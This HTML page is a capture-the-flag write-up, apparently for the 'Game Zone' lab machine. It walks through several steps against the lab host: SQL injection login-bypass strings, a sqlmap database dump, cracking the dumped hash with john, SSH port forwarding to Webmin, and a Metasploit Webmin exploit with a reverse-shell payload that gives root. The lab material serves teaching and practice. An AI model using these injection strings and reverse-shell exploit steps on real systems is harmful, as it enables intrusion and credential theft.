<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>game zone</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>game zone</h1><br/><strong>Game Zone</strong><br /><br /><br />What is the name of the image ?<br /><strong>Agent47</strong><br /><br />Open the Webserver at 10.10.169.69<br /><br />We will first use manual sql injection to login.<br /><br /><strong>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- -</strong><br />OR<br /><strong>SELECT * FROM users WHERE username</strong> = &#39; or 1=1 -- -<br />OR<br /><strong>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 </strong>#<br />OR<br /><strong>SELECT * FROM users WHERE username</strong> = &#39; or 1=1 #<br /><br />We successfully logged in with blank username.<br /><br />In the next page we face a game search page.<br />We start burpsuite and capture a test request<br />Then save it to <em><strong>request.txt</strong></em> for further usage by sqlmap<br /><br />In part 2, we enumerate the search page with sqlmap.<br /><strong>sqlmap -r request.txt --dbms=mysql --dump</strong><br /><br />Here we have 2 options to use inbuilt password cracking. (use custom wordlist of rockyou.txt and crack the hash).<br />Or<br />after sqlmap running is done, we go to the temporary hash location which sqlmap created.<br />Then crack it using <em><strong>john</strong></em><br /><br />Once we have the password we can ssh into the machine to get user flag<br /><br /><br /><br /><strong>Privelege Escalation</strong><br /><br />ss -tulpn<br /><br />To check socket information on target machine. We find CMS app webmin running on localhost.<br />We use SSH Reverse tunneling to access the app from our Kali machine browser.<br /><br /><em><strong>ssh -L 9999:localhost:10000 agent47@10.10.169.69</strong></em><br /><br />Then we open mozilla and go to localhost:9999<br />we get to the CMS App webpage.<br /><br />We login with <strong>agent47</strong> and <strong>videogamer124</strong><br /><br /><br />We discover the App version as Webmin 1.580<br /><br />searchsplit webmin 1.580<br /><br /><img src="images/8-1.png" alt="images/8-1.png" /><br /><br /><br />We use metasploit console.<br /><br /><em><strong>use exploit/unix/webapp/webmin_show_cgi_exec</strong></em><br /><br />we tried different payloads.(Almost all)<br /><em><strong>show payloads</strong></em> : Will show compatible payload for the exploit.<br /><br /><strong>Following is the working Payload and option configuration</strong>:<br /><br /><em><strong>use payload cmd/unix/reverse</strong></em><br /><br /><strong>Options:</strong><br /><img src="images/8-2.png" alt="images/8-2.png" /><br /><br /><strong>Note:</strong> Change these as per the image above RHOSTS,RPORT,PASSWORD,USERNAME,LHOST,LPORT,SSL<br /><br />Once we run this we get a shell as root.<br />We get the root flag in /root directory.<br /><br />Thanks !!</div>
</body>
</html>
